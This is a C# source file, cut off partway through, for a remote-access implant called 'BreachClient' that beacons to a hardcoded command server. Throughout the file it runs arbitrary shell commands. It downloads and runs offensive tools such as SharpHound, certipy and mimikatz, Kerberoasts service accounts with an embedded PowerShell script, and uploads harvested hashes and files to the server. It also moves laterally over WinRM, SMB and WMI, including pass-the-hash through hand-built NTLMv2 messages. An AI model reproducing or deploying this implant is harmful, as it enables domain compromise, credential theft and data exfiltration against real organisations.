using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace BreachClient
{
    class Program
    {
        private static readonly HttpClient http = new HttpClient();
        private static readonly string ServerId = "http://192.168.10.4:8080";
        private static readonly string AgentId = "AGENT_001"; // Set this before compiling — must be unique per target
        private static readonly int BeaconInterval = 5000; // ms

        static async Task Main(string[] args)
        {
            while (true)
            {
                try
                {
                    await Checkin();
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[-] Beacon error: {e.Message}");
                }

                await Task.Delay(BeaconInterval);
            }
        }

        static string GetLocalIP()
        {
            try
            {
                using var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                socket.Connect("8.8.8.8", 65530);
                return ((IPEndPoint)socket.LocalEndPoint!).Address.ToString();
            }
            catch { return ""; }
        }

        static async Task Checkin()
        {
            var payload = JsonSerializer.Serialize(new
            {
                agent_id = AgentId,
                hostname = Environment.MachineName,
                username = Environment.UserName,
                ip       = GetLocalIP()
            });

            var response = await http.PostAsync(
                $"{ServerId}/checkin",
                new StringContent(payload, Encoding.UTF8, "application/json")
            );

            var body = await response.Content.ReadAsStringAsync();
            var doc = JsonDocument.Parse(body).RootElement;

            if (doc.TryGetProperty("task_id", out var taskIdEl) &&
                taskIdEl.ValueKind != JsonValueKind.Null)
            {
                int taskId = taskIdEl.GetInt32();
                string taskType   = doc.GetProperty("task_type").GetString()!;
                string instruction = doc.GetProperty("instruction").GetString()!;

                string output = taskType switch
                {
                    "recon"        => await RunRecon(instruction),
                    "sharphound"   => await RunSharpHound(instruction),
                    "certipy"      => await RunCertipy(instruction),
                    "kerberoast"   => await RunKerberoast(instruction),
                    "secretsdump"  => await RunDownloadAndExec(instruction),
                    "dpapi"        => await RunDownloadAndExec(instruction),
                    "authenticate" => await RunAuthenticate(instruction),
                    "aclabuse"     => RunAclAbuse(instruction),
                    "pivot"        => await RunPivotAgent(instruction),
                    _              => ExecuteCommand(instruction)
                };

                await PostResult(taskId, output);
            }
        }

        // ── Shell execution ───────────────────────────────────────────────────

        static string ExecuteCommand(string instruction)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName               = "cmd.exe",
                    Arguments              = $"/c {instruction}",
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true,
                    UseShellExecute        = false,
                    CreateNoWindow         = true
                };

                using var proc = Process.Start(psi)!;
                string stdout = proc.StandardOutput.ReadToEnd();
                string stderr = proc.StandardError.ReadToEnd();
                proc.WaitForExit();

                return string.IsNullOrWhiteSpace(stderr) ? stdout : stdout + "\n[stderr] " + stderr;
            }
            catch (Exception e)
            {
                return $"[exec error] {e.Message}";
            }
        }

        // ── Tool download / upload helpers ────────────────────────────────────

        /// <summary>Download a tool from /files/<toolName> and save it to %TEMP%.</summary>
        static async Task<string?> DownloadTool(string toolName)
        {
            try
            {
                var resp = await http.GetAsync($"{ServerId}/files/{toolName}");
                if (!resp.IsSuccessStatusCode)
                    return null;

                string dest = Path.Combine(Path.GetTempPath(), toolName);
                var bytes = await resp.Content.ReadAsByteArrayAsync();
                await File.WriteAllBytesAsync(dest, bytes);
                return dest;
            }
            catch
            {
                return null;
            }
        }

        /// <summary>Upload a file from the agent back to the server's /upload endpoint.</summary>
        static async Task UploadFile(string filePath)
        {
            try
            {
                using var form = new MultipartFormDataContent();
                form.Add(new StringContent(AgentId), "agent_id");

                var bytes = await File.ReadAllBytesAsync(filePath);
                form.Add(new ByteArrayContent(bytes), "file", Path.GetFileName(filePath));

                await http.PostAsync($"{ServerId}/upload", form);
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Upload failed: {e.Message}");
            }
        }

        // ── SharpHound module ─────────────────────────────────────────────────

        /// <summary>
        /// Download SharpHound.exe from the server, run it in a temp working directory,
        /// upload any ZIP files it produces back to the server, then return stdout.
        ///
        /// Instruction: SharpHound CLI args (e.g. "-d ICCN.LOCAL --CollectionMethods All")
        /// Leave empty to use SharpHound defaults.
        /// </summary>
        static async Task<string> RunSharpHound(string args)
        {
            string? toolPath = await DownloadTool("SharpHound.exe");
            if (toolPath == null)
                return "[error] Failed to download SharpHound.exe from server";

            // Run in a dedicated temp directory so ZIP output is easy to find
            string workDir = Path.Combine(Path.GetTempPath(), "sh_" + Guid.NewGuid().ToString("N")[..8]);
            Directory.CreateDirectory(workDir);

            string shPath = Path.Combine(workDir, "SharpHound.exe");
            File.Copy(toolPath, shPath, overwrite: true);

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName               = shPath,
                    Arguments              = string.IsNullOrWhiteSpace(args) ? "--zipfilename loot" : args,
                    WorkingDirectory       = workDir,
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true,
                    UseShellExecute        = false,
                    CreateNoWindow         = true
                };

                using var proc = Process.Start(psi)!;
                string stdout = proc.StandardOutput.ReadToEnd();
                string stderr = proc.StandardError.ReadToEnd();
                proc.WaitForExit();

                // Upload every ZIP SharpHound produced
                var zips = Directory.GetFiles(workDir, "*.zip");
                foreach (var zip in zips)
                    await UploadFile(zip);

                string result = string.IsNullOrWhiteSpace(stderr)
                    ? stdout
                    : stdout + "\n[stderr] " + stderr;

                return result.Trim() + $"\n[+] Uploaded {zips.Length} ZIP file(s) to server";
            }
            finally
            {
                try { Directory.Delete(workDir, recursive: true); } catch { }
            }
        }

        // ── Certipy module (ADCS enumeration) ────────────────────────────────

        /// <summary>
        /// Download certipy.exe from the server, run it in a temp working directory,
        /// upload any output files it produces (.json, .txt, .zip), then return stdout.
        ///
        /// Instruction: certipy subcommand + args
        ///   e.g. "find -u administrator@corp.local -p Password123 -dc-ip 10.0.0.1"
        ///        "find -u administrator@corp.local -hashes :aad3b435b51404eeaad3b435b51404ee:... -dc-ip 10.0.0.1"
        /// </summary>
        static async Task<string> RunCertipy(string args)
        {
            string? toolPath = await DownloadTool("certipy.exe");
            if (toolPath == null)
                return "[error] Failed to download certipy.exe from server";

            string workDir = Path.Combine(Path.GetTempPath(), "cp_" + Guid.NewGuid().ToString("N")[..8]);
            Directory.CreateDirectory(workDir);

            string cpPath = Path.Combine(workDir, "certipy.exe");
            File.Copy(toolPath, cpPath, overwrite: true);

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName               = cpPath,
                    Arguments              = args,
                    WorkingDirectory       = workDir,
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true,
                    UseShellExecute        = false,
                    CreateNoWindow         = true
                };

                using var proc = Process.Start(psi)!;
                string stdout = proc.StandardOutput.ReadToEnd();
                string stderr = proc.StandardError.ReadToEnd();
                proc.WaitForExit();

                // Upload all output files certipy produced (.json, .txt, .zip)
                var outputFiles = Directory.GetFiles(workDir)
                    .Where(f => !f.EndsWith("certipy.exe", StringComparison.OrdinalIgnoreCase))
                    .ToArray();
                foreach (var f in outputFiles)
                    await UploadFile(f);

                string result = string.IsNullOrWhiteSpace(stderr)
                    ? stdout
                    : stdout + "\n[stderr] " + stderr;

                return result.Trim() + $"\n[+] Uploaded {outputFiles.Length} output file(s) to server";
            }
            finally
            {
                try { Directory.Delete(workDir, recursive: true); } catch { }
            }
        }

        // ── Kerberoast module ─────────────────────────────────────────────────

        /// <summary>
        /// Enumerate SPN accounts via ADSI, request TGS tickets natively using
        /// System.IdentityModel, parse the raw ASN.1 AP-REQ to extract the cipher,
        /// and output hashes in hashcat $krb5tgs$ format.
        /// No external tools required — uses only what is already on Windows.
        /// </summary>
        static async Task<string> RunKerberoast(string _)
        {
            string script = @"
Add-Type -AssemblyName System.IdentityModel

function ParseLen([byte[]]$bytes, [ref]$pos) {
    $b = $bytes[$pos.Value]; $pos.Value++
    if ($b -lt 0x80) { return [int]$b }
    $nb = $b -band 0x7f; $val = 0
    for ($j = 0; $j -lt $nb; $j++) { $val = ($val -shl 8) -bor $bytes[$pos.Value]; $pos.Value++ }
    return [int]$val
}

function EnterTag([byte[]]$bytes, [ref]$pos, [byte]$tag) {
    if ($bytes[$pos.Value] -ne $tag) {
        throw ""Tag mismatch at $($pos.Value): expected 0x$([Convert]::ToString($tag,16)) got 0x$([Convert]::ToString($bytes[$pos.Value],16))""
    }
    $pos.Value++
    return ParseLen $bytes $pos
}

function SkipTLV([byte[]]$bytes, [ref]$pos) {
    $pos.Value++
    $len = ParseLen $bytes $pos
    $pos.Value += $len
}

function ExtractCipher([byte[]]$apreq) {
    $pos = [ref]0
    # GetRequest() wraps the AP-REQ in a GSS-API envelope (tag 0x60 = [APPLICATION 0]).
    # Strip it: skip the outer tag+length, then skip the Kerberos OID TLV (tag 0x06).
    if ($apreq[$pos.Value] -eq 0x60) {
        $pos.Value++
        $null = ParseLen $apreq $pos
        $pos.Value++                        # skip OID tag (0x06)
        $oidLen = ParseLen $apreq $pos
        $pos.Value += $oidLen               # skip OID bytes
        $pos.Value += 2                     # skip 2-byte RFC 1964 token type ID (0x01 0x00 for AP-REQ)
    }
    $null = EnterTag $apreq $pos 0x6e   # Application 14 (AP-REQ)
    $null = EnterTag $apreq $pos 0x30   # SEQUENCE
    SkipTLV $apreq $pos                  # [0] pvno
    SkipTLV $apreq $pos                  # [1] msg-type
    SkipTLV $apreq $pos                  # [2] ap-options
    $null = EnterTag $apreq $pos 0xa3   # [3] ticket
    $null = EnterTag $apreq $pos 0x61   # Application 1 (Ticket)
    $null = EnterTag $apreq $pos 0x30   # SEQUENCE
    SkipTLV $apreq $pos                  # [0] tkt-vno
    SkipTLV $apreq $pos                  # [1] realm
    SkipTLV $apreq $pos                  # [2] sname
    $null = EnterTag $apreq $pos 0xa3   # [3] enc-part
    $null = EnterTag $apreq $pos 0x30   # EncryptedData SEQUENCE
    $null = EnterTag $apreq $pos 0xa0   # [0] etype context
    $etypeLen = EnterTag $apreq $pos 0x02  # INTEGER
    $etype = 0
    for ($j = 0; $j -lt $etypeLen; $j++) { $etype = ($etype -shl 8) -bor $apreq[$pos.Value]; $pos.Value++ }
    if ($apreq[$pos.Value] -eq 0xa1) { SkipTLV $apreq $pos }  # skip optional [1] kvno
    $null = EnterTag $apreq $pos 0xa2   # [2] cipher context
    $cipherLen = EnterTag $apreq $pos 0x04  # OCTET STRING
    $cipher = $apreq[$pos.Value..($pos.Value + $cipherLen - 1)]
    return @{ etype = $etype; cipher = $cipher }
}

$domain = $env:USERDNSDOMAIN
$root = New-Object System.DirectoryServices.DirectoryEntry(""LDAP://$domain"")
$searcher = New-Object System.DirectoryServices.DirectorySearcher($root)
$searcher.Filter = ""(&(objectCategory=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))""
$searcher.PropertiesToLoad.AddRange([string[]]@(""samaccountname"", ""serviceprincipalname""))
$results = $searcher.FindAll()

if ($results.Count -eq 0) {
    Write-Host ""[-] No kerberoastable accounts found""
    exit
}

Write-Host ""[*] Found $($results.Count) account(s) with SPNs""

foreach ($r in $results) {
    $user = $r.Properties[""samaccountname""][0]
    foreach ($spn in $r.Properties[""serviceprincipalname""]) {
        try {
            $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
            $bytes = $token.GetRequest()
            $parsed = ExtractCipher $bytes
            $cipher = $parsed.cipher
            $etype  = $parsed.etype

            if ($etype -eq 23) {
                $check = ($cipher[0..15]                  | ForEach-Object { '{0:x2}' -f $_ }) -join ''
                $data  = ($cipher[16..($cipher.Length-1)] | ForEach-Object { '{0:x2}' -f $_ }) -join ''
                Write-Host ""`$krb5tgs`$23`$*$($user)*$($domain)*$($spn)*`$$($check)`$$($data)""
            } elseif ($etype -eq 17 -or $etype -eq 18) {
                $hex = ($cipher | ForEach-Object { '{0:x2}' -f $_ }) -join ''
                Write-Host ""`$krb5tgs`$$($etype)`$*$($user)*$($domain)*$($spn)*`$$($hex)""
            } else {
                Write-Host ""[-] $($user) : $($spn) - unsupported etype $($etype)""
            }
        } catch {
            Write-Host ""[-] Failed $($spn) : $_""
        }
    }
}
";
            string output = RunPowerShell(script);

            var hashLines = output.Split('\n')
                .Select(l => l.Trim())
                .Where(l => l.StartsWith("$krb5tgs$"))
                .ToArray();

            if (hashLines.Length > 0)
            {
                string hashFile = Path.Combine(Path.GetTempPath(), "kbr_" + Guid.NewGuid().ToString("N")[..8] + ".txt");
                await File.WriteAllLinesAsync(hashFile, hashLines);
                await UploadFile(hashFile);
                try { File.Delete(hashFile); } catch { }
                return output.Trim() + $"\n[+] {hashLines.Length} hash(es) uploaded to server";
            }

            return output.Trim();
        }

        // ── Generic tool execution (secretsdump, dpapi, …) ───────────────────

        /// <summary>
        /// Download a tool from /files/ and run it. The instruction format is:
        ///   "toolname.exe [args...]"
        /// The first token is the filename to download; the rest are passed as arguments.
        ///
        /// Examples:
        ///   "mimikatz.exe sekurlsa::logonpasswords exit"
        ///   "SharpDPAPI.exe triage"
        /// </summary>
        static async Task<string> RunDownloadAndExec(string instruction)
        {
            var parts    = instruction.Split(' ', 2, StringSplitOptions.RemoveEmptyEntries);
            string tool  = parts[0];
            string tArgs = parts.Length > 1 ? parts[1] : "";

            string? toolPath = await DownloadTool(tool);
            if (toolPath == null)
                return $"[error] Failed to download {tool} from server";

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName               = toolPath,
                    Arguments              = tArgs,
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true,
                    UseShellExecute        = false,
                    CreateNoWindow         = true
                };

                using var proc = Process.Start(psi)!;
                string stdout = proc.StandardOutput.ReadToEnd();
                string stderr = proc.StandardError.ReadToEnd();
                proc.WaitForExit();

                return string.IsNullOrWhiteSpace(stderr) ? stdout : stdout + "\n[stderr] " + stderr;
            }
            catch (Exception e)
            {
                return $"[exec error] {e.Message}";
            }
        }

        // ── Authentication / lateral movement ────────────────────────────────────

        /// <summary>
        /// Authenticate to a remote host using a native Windows service.
        /// Instruction format: "username|credential|target|service[|command]"
        /// credential is a plaintext password or an NTLM hash (:NT or LM:NT or 32-hex).
        /// Services: winrm, smb, wmi.  PTH uses WinRM (native NTLM) or Invoke-TheHash (WMI/SMB).
        /// </summary>
        static async Task<string> RunAuthenticate(string instruction)
        {
            var parts = instruction.Split('|');
            if (parts.Length < 4)
                return "[error] Invalid authenticate instruction — expected: user|credential|target|service[|command]";

            string username = parts[0];
            string secret   = parts[1];
            string target   = parts[2];
            string service  = parts[3].ToLower();
            string? command = parts.Length >= 5 ? parts[4] : null;

            if (IsNtlmHash(secret))
                return service switch
                {
                    "wmi" => await RunPthTool(username, secret, target, "wmi", command),
                    "smb" => await RunPthTool(username, secret, target, "smb", command),
                    _     => await RunWinrmPth(username, secret, target, command)
                };

            return service switch
            {
                "smb" => RunSmbAuth(username, secret, target, command),
                "wmi" => RunWmiAuth(username, secret, target, command),
                _     => RunWinrmAuth(username, secret, target, command)
            };
        }

        /// <summary>
        /// WinRM — run a remote command via winrs.
        /// Defaults to whoami/hostname/ipconfig probe when no command is specified.
        /// </summary>
        static string RunWinrmAuth(string username, string password, string target, string? command)
        {
            string cmd = string.IsNullOrWhiteSpace(command)
                ? "whoami && hostname && ipconfig"
                : command;
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName               = "winrs.exe",
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true,
                    UseShellExecute        = false,
                    CreateNoWindow         = true
                };
                psi.ArgumentList.Add($"-r:http://{target}:5985");
                psi.ArgumentList.Add($"-u:{username}");
                psi.ArgumentList.Add($"-p:{password}");

                // PowerShell commands: base64-encode to avoid quoting hell through winrs→cmd chain
                if (cmd.StartsWith("powershell", StringComparison.OrdinalIgnoreCase))
                {
                    string script = cmd.Substring("powershell".Length).TrimStart();
                    if (script.StartsWith("-c ", StringComparison.OrdinalIgnoreCase))
                        script = script.Substring(3).Trim();
                    // Strip outer escaped quotes \" ... \" or plain " ... "
                    if (script.StartsWith("\\\"")) script = script.Substring(2);
                    else if (script.StartsWith("\""))  script = script.Substring(1);
                    if (script.EndsWith("\\\"")) script = script.Substring(0, script.Length - 2);
                    else if (script.EndsWith("\""))  script = script.Substring(0, script.Length - 1);
                    // Unescape any remaining \" → "
                    script = script.Replace("\\\"", "\"");
                    string encoded = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
                    psi.ArgumentList.Add("powershell");
                    psi.ArgumentList.Add("-NonInteractive");
                    psi.ArgumentList.Add("-EncodedCommand");
                    psi.ArgumentList.Add(encoded);
                }
                else
                {
                    psi.ArgumentList.Add("cmd");
                    psi.ArgumentList.Add("/c");
                    psi.ArgumentList.Add(cmd);
                }

                using var proc = Process.Start(psi)!;
                var stdoutTask = proc.StandardOutput.ReadToEndAsync();
                var stderrTask = proc.StandardError.ReadToEndAsync();
                proc.WaitForExit();
                string stdout = stdoutTask.Result;
                string stderr = stderrTask.Result;
                return string.IsNullOrWhiteSpace(stderr) ? stdout : stdout + "\n[stderr] " + stderr;
            }
            catch (Exception e)
            {
                return $"[exec error] {e.Message}";
            }
        }

        /// <summary>
        /// SMB — authenticate via IPC$, list shares, then clean up.
        /// If a command is specified, a note is returned — SMB auth does not support remote exec.
        /// </summary>
        static string RunSmbAuth(string username, string password, string target, string? command)
        {
            // Clean up any existing session first to avoid "multiple connections" error
            ExecuteCommand($"net use \\\\{target}\\IPC$ /delete /yes 2>nul");

            string connect = ExecuteCommand($"net use \\\\{target}\\IPC$ \"{password}\" /user:{username}");

            bool failed = connect.Contains("error", StringComparison.OrdinalIgnoreCase)
                       || connect.Contains("Access is denied", StringComparison.OrdinalIgnoreCase)
                       || connect.Contains("invalid", StringComparison.OrdinalIgnoreCase)
                       || connect.Contains("incorrect", StringComparison.OrdinalIgnoreCase)
                       || connect.Contains("denied", StringComparison.OrdinalIgnoreCase);

            if (failed)
            {
                ExecuteCommand($"net use \\\\{target}\\IPC$ /delete /yes 2>nul");
                return connect.Trim();
            }

            string shares = ExecuteCommand($"net view \\\\{target}");
            ExecuteCommand($"net use \\\\{target}\\IPC$ /delete /yes");

            string result = connect.Trim() + "\n" + shares.Trim();
            if (!string.IsNullOrWhiteSpace(command))
                result += "\n[note] SMB auth does not support -c; use winrm or wmi for remote execution";
            return result;
        }

        /// <summary>
        /// WMI — run a remote command via wmic process call create, or list processes as a default probe.
        /// Note: process call create does not capture stdout; output shows PID and return value only.
        /// </summary>
        static string RunWmiAuth(string username, string password, string target, string? command)
        {
            if (!string.IsNullOrWhiteSpace(command))
            {
                // Escape double quotes inside the command
                string escaped = command.Replace("\"", "\\\"");
                return ExecuteCommand(
                    $"wmic /node:{target} /user:{username} /password:\"{password}\" process call create \"{escaped}\""
                );
            }
            return ExecuteCommand(
                $"wmic /node:{target} /user:{username} /password:\"{password}\" process list brief"
            );
        }

        // ── PTH module ────────────────────────────────────────────────────────────
        //
        // WinRM PTH: implements NTLMv2 by hand over a raw TCP keep-alive connection.
        // No external tools needed; full stdout/stderr capture.
        //
        // WMI / SMB PTH fallback: downloads Invoke-TheHash.ps1 from the server and
        // invokes Invoke-WMIExec / Invoke-SMBExec.  Output is blind (WMI/SMB exec
        // does not capture stdout), so the return is a success/fail indicator.

        static bool IsNtlmHash(string s)
        {
            if (s.StartsWith(":")) s = s[1..];
            if (s.Contains(':'))   s = s.Split(':')[^1];
            return s.Length == 32 && s.All(c => "0123456789abcdefABCDEF".Contains(c));
        }

        static byte[] ParseNtHash(string s)
        {
            if (s.StartsWith(":")) s = s[1..];
            if (s.Contains(':'))   s = s.Split(':')[^1];
            byte[] b = new byte[16];
            for (int i = 0; i < 16; i++)
                b[i] = Convert.ToByte(s.Substring(i * 2, 2), 16);
            return b;
        }

        // Split "DOMAIN\user" or "user@domain" → (domain, user).  Plain user → (".", user).
        static (string domain, string user) SplitDomainUser(string username)
        {
            int bs = username.IndexOf('\\');
            if (bs >= 0) return (username[..bs], username[(bs + 1)..]);
            int at = username.IndexOf('@');
            if (at >= 0) return (username[(at + 1)..], username[..at]);
            return (".", username);
        }

        // ── NTLM message builders ────────────────────────────────────────────────

        static byte[] NtlmNegotiate()
        {
            // Flags: UNICODE | REQUEST_TARGET | NTLM | ALWAYS_SIGN | EXTENDED_SESS | 128 | 56 | VERSION
            const uint flags = 0xA2088205u;
            using var ms = new MemoryStream();
            using var bw = new BinaryWriter(ms, Encoding.ASCII, leaveOpen: true);
            bw.Write(Encoding.ASCII.GetBytes("NTLMSSP\0"));
            bw.Write((uint)1);
            bw.Write(flags);
            bw.Write((ushort)0); bw.Write((ushort)0); bw.Write((uint)40); // DomainNameFields  (empty)
            bw.Write((ushort)0); bw.Write((ushort)0); bw.Write((uint)40); // WorkstationFields (empty)
            bw.Write((byte)10); bw.Write((byte)0); bw.Write((ushort)19041); // Version: Win10 19041
            bw.Write((byte)0);  bw.Write((byte)0); bw.Write((byte)0); bw.Write((byte)15);
            return ms.ToArray(); // 40 bytes
        }

        // Extract ServerChallenge[8] and TargetInfo blob from NTLM Type-2 message.
        static (byte[] sc, byte[] ti) NtlmParseChallenge(byte[] t2)
        {
            byte[] sc = new byte[8];
            Array.Copy(t2, 24, sc, 0, 8);
            ushort tiLen = BitConverter.ToUInt16(t2, 40);
            uint   tiOff = BitConverter.ToUInt32(t2, 44);
            byte[] ti    = new byte[tiLen];
            if (tiLen > 0 && tiOff + tiLen <= t2.Length)
                Array.Copy(t2, tiOff, ti, 0, tiLen);
            return (sc, ti);
        }

        // Compute NTLMv2 NT and LM responses given the NT hash.
        static (byte[] ntResp, byte[] lmResp) NtlmComputeResponses(
            byte[] ntHash, string user, string domain, byte[] sc, byte[] ti)
        {
            byte[] rk;
            using (var h = new HMACMD5(ntHash))
                rk = h.ComputeHash(Encoding.Unicode.GetBytes(user.ToUpperInvariant() + domain));

            byte[] cc = new byte[8];
            RandomNumberGenerator.Fill(cc);

            var blob = new List<byte>();
            blob.Add(0x01); blob.Add(0x01);                                 // RespType
            blob.AddRange(new byte[6]);                                      // Reserved
            blob.AddRange(BitConverter.GetBytes(DateTime.UtcNow.ToFileTime())); // Timestamp
            blob.AddRange(cc);                                               // ClientChallenge
            blob.AddRange(new byte[4]);                                      // Reserved
            blob.AddRange(ti);                                               // TargetInfo
            blob.AddRange(new byte[4]);                                      // Reserved
            byte[] blobArr = blob.ToArray();

            byte[] ntProof;
            using (var h = new HMACMD5(rk)) ntProof = h.ComputeHash(sc.Concat(blobArr).ToArray());
            byte[] ntResp = ntProof.Concat(blobArr).ToArray();

            byte[] lmProof;
            using (var h = new HMACMD5(rk)) lmProof = h.ComputeHash(sc.Concat(cc).ToArray());
            byte[] lmResp = lmProof.Concat(cc).ToArray(); // 24 bytes

            return (ntResp, lmResp);
        }

        // Build NTLM Type-3 Authenticate message.
        static byte[] NtlmAuthenticate(string user, string domain, byte[] ntResp, byte[] lmResp)
        {
            byte[] domB  = Encoding.Unicode.GetBytes(domain);
            byte[] userB = Encoding.Unicode.GetBytes(user);
            byte[] wsB   = Encoding.Unicode.GetBytes(Environment.MachineName);
            const uint flags = 0xA2088205u;
            // Fixed header: sig(8) + type(4) + 6×SecurityBuffer(8) + flags(4) + version(8) = 72 bytes
            uint off     = 72u;
            uint lmOff   = off;
            uint ntOff   = lmOff   + (uint)lmResp.Length;
            uint domOff  = ntOff   + (uint)ntResp.Length;
            uint userOff = domOff  + (uint)domB.Length;
            uint wsOff   = userOff + (uint)userB.Length;
            uint sessOff = wsOff   + (uint)wsB.Length;
            using var ms = new MemoryStream();
            using var bw = new BinaryWriter(ms, Encoding.ASCII, leaveOpen: true);
            bw.Write(Encoding.ASCII.GetBytes("NTLMSSP\0"));
            bw.Write((uint)3);
            bw.Write((ushort)lmResp.Length);  bw.Write((ushort)lmResp.Length);  bw.Write(lmOff);
            bw.Write((ushort)ntResp.Length);  bw.Write((ushort)ntResp.Length);  bw.Write(ntOff);
            bw.Write((ushort)domB.Length);    bw.Write((ushort)domB.Length);    bw.Write(domOff);
            bw.Write((ushort)userB.Length);   bw.Write((ushort)userB.Length);   bw.Write(userOff);
            bw.Write((ushort)wsB.Length);     bw.Write((ushort)wsB.Length);     bw.Write(wsOff);
            bw.Write((ushort)0); bw.Write((ushort)0); bw.Write(sessOff); // SessionKey (empty)
            bw.Write(flags);
            bw.Write((byte)10); bw.Write((byte)0); bw.Write((ushort)19041);
            bw.Write((byte)0);  bw.Write((byte)0); bw.Write((byte)0); bw.Write((byte)15);
            bw.Write(lmResp); bw.Write(ntResp); bw.Write(domB); bw.Write(userB); bw.Write(wsB);
            return ms.ToArray();
        }

        // ── WinRM SOAP templates ─────────────────────────────────────────────────

        static string XmlEsc(string s) =>
            s.Replace("&", "&amp;").Replace("<", "&lt;").Replace(">", "&gt;").Replace("\"", "&quot;");

        // Namespace-agnostic: finds first element with the given local name and returns its text content.
        static string? XmlText(string xml, string local) =>
            Regex.Match(xml, $@"<[^:>\s]*:?{Regex.Escape(local)}[^>]*>([^<]*)<",
                RegexOptions.IgnoreCase) is { Success: true } m
                ? m.Groups[1].Value.Trim() : null;

        const string _wsNs =
            "xmlns:env=\"http://www.w3.org/2003/05/soap-envelope\" " +
            "xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" " +
            "xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\" " +
            "xmlns:rsp=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell\"";

        static string WsHdr(string target, string action, string? shellId = null) =>
$@"<env:Header>
    <a:To>http://{target}:5985/wsman</a:To>
    <a:ReplyTo><a:Address env:mustUnderstand=""true"">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address></a:ReplyTo>
    <a:Action env:mustUnderstand=""true"">{action}</a:Action>
    <a:MessageID>uuid:{Guid.NewGuid():D}</a:MessageID>
    <w:ResourceURI env:mustUnderstand=""true"">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>
    <w:OperationTimeout>PT60.000S</w:OperationTimeout>
    <w:MaxEnvelopeSize env:mustUnderstand=""true"">153600</w:MaxEnvelopeSize>
    {(shellId != null ? $"<w:SelectorSet><w:Selector Name=\"ShellId\">{shellId}</w:Selector></w:SelectorSet>" : "")}
  </env:Header>";

        static string WsCreateShell(string t) =>
$@"<?xml version=""1.0"" encoding=""UTF-8""?><env:Envelope {_wsNs}>{WsHdr(t, "http://schemas.xmlsoap.org/ws/2004/09/transfer/Create")}<env:Body><rsp:Shell><rsp:InputStreams>stdin</rsp:InputStreams><rsp:OutputStreams>stdout stderr</rsp:OutputStreams></rsp:Shell></env:Body></env:Envelope>";

        static string WsCommand(string t, string sid, string cmd) =>
$@"<?xml version=""1.0"" encoding=""UTF-8""?><env:Envelope {_wsNs}>{WsHdr(t, "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command", sid)}<env:Body><rsp:CommandLine><rsp:Command>cmd</rsp:Command><rsp:Arguments>/c {XmlEsc(cmd)}</rsp:Arguments></rsp:CommandLine></env:Body></env:Envelope>";

        static string WsReceive(string t, string sid, string cid) =>
$@"<?xml version=""1.0"" encoding=""UTF-8""?><env:Envelope {_wsNs}>{WsHdr(t, "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive", sid)}<env:Body><rsp:Receive><rsp:DesiredStream CommandId=""{cid}"">stdout stderr</rsp:DesiredStream></rsp:Receive></env:Body></env:Envelope>";

        static string WsSignal(string t, string sid, string cid) =>
$@"<?xml version=""1.0"" encoding=""UTF-8""?><env:Envelope {_wsNs}>{WsHdr(t, "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Signal", sid)}<env:Body><rsp:Signal CommandId=""{cid}""><rsp:Code>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/signal/terminate</rsp:Code></rsp:Signal></env:Body></env:Envelope>";

        static string WsDelete(string t, string sid) =>
$@"<?xml version=""1.0"" encoding=""UTF-8""?><env:Envelope {_wsNs}>{WsHdr(t, "http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete", sid)}<env:Body></env:Body></env:Envelope>";

        // ── Raw HTTP helpers (keep-alive TCP — required for connection-bound NTLM) ─

        static async Task PthSend(NetworkStream ns, string host, string? auth, string? soap)
        {
            byte[] body = soap != null ? Encoding.UTF8.GetBytes(soap) : Array.Empty<byte>();
            var sb = new StringBuilder();
            sb.Append("POST /wsman HTTP/1.1\r\n");
            sb.Append($"Host: {host}:5985\r\n");
            if (!string.IsNullOrEmpty(auth)) sb.Append($"Authorization: NTLM {auth}\r\n");
            sb.Append("Connection: keep-alive\r\n");
            if (body.Length > 0)
            {
                sb.Append("Content-Type: application/soap+xml;charset=UTF-8\r\n");
                sb.Append($"Content-Length: {body.Length}\r\n");
            }
            else sb.Append("Content-Length: 0\r\n");
            sb.Append("\r\n");
            byte[] hdr = Encoding.ASCII.GetBytes(sb.ToString());
            await ns.WriteAsync(hdr);
            if (body.Length > 0) await ns.WriteAsync(body);
            await ns.FlushAsync();
        }

        static async Task<(int status, string ntlm, string body)> PthRead(NetworkStream ns)
        {
            // Read until \r\n\r\n
            var raw = new List<byte>(512);
            int a = 0, b = 0, c = 0;
            while (true)
            {
                int ch = ns.ReadByte(); if (ch < 0) break;
                raw.Add((byte)ch);
                if (a == '\r' && b == '\n' && c == '\r' && ch == '\n') break;
                a = b; b = c; c = ch;
            }
            string[] lines = Encoding.ASCII.GetString(raw.ToArray())
                                     .Split("\r\n", StringSplitOptions.RemoveEmptyEntries);

            int status = 0;
            if (lines.Length > 0 && lines[0].Split(' ') is { Length: >= 2 } sp)
                int.TryParse(sp[1], out status);

            string ntlm = ""; int clen = 0; bool chunked = false;
            foreach (var ln in lines.Skip(1))
            {
